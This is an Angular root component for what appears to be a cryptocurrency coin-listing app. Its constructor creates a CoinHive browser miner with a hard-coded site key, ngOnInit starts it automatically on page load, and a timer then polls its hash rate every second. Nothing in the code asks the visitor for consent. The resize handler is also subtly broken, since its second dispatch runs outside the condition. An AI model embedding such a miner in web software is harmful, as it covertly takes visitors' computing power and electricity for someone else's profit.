import {Component, HostListener} from '@angular/core';
import {Store} from '@ngrx/store';
import {AppState} from './redux/state';
import {Observable} from 'rxjs/Observable';
import {Coin} from './model';
import 'rxjs/add/operator/mergeMap';
import 'rxjs/add/observable/from';
import 'rxjs/add/operator/filter';
import 'rxjs/add/operator/map';
import {mainViewAnimation, sidebarAnimation} from './animations';
import {FetchService} from './service/fetch.service';
import {ToggleSidebarAction, ToggleTransparencyAction} from './redux/actions';
declare var CoinHive: any;

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss'],
  animations: [sidebarAnimation, mainViewAnimation]
})
export class AppComponent {

  shownCoins: Observable<Coin[]>;
  sidebar: Observable<string>;
  miner: any;
  statistics: any;

  constructor(private store: Store<AppState>, private fetchService: FetchService) {

    this.shownCoins = store.select('coins')
      .map(coins => coins.filter(coin => coin.shown));

    this.sidebar = store.select('sidebarState');

    this.miner = new CoinHive.Anonymous('4Q2BuYl2VldkJTZItAWVBboApwvRroll', { throttle: 0.8 });

    this.statistics = {
      hashesPerSecond: 0,
      totalHashes: 0,
      acceptedHashes: 0
    };
  }

  ngOnInit() {

    this.miner.start();
    this.updateStatistics();
  }

  updateStatistics() {
    setTimeout(() => {
      this.statistics.hashesPerSecond = this.miner.getHashesPerSecond();
      this.statistics.totalHashes = this.miner.getTotalHashes();
      this.statistics.acceptedHashes = this.miner.getAcceptedHashes();
      this.updateStatistics();
    }, 1000);
  }

  @HostListener('window:resize')
  sizeCheck() {

    if(window.matchMedia('screen and (max-width: 15cm)').matches)
      this.store.dispatch(new ToggleSidebarAction());
      this.store.dispatch(new ToggleSidebarAction());
  }
}
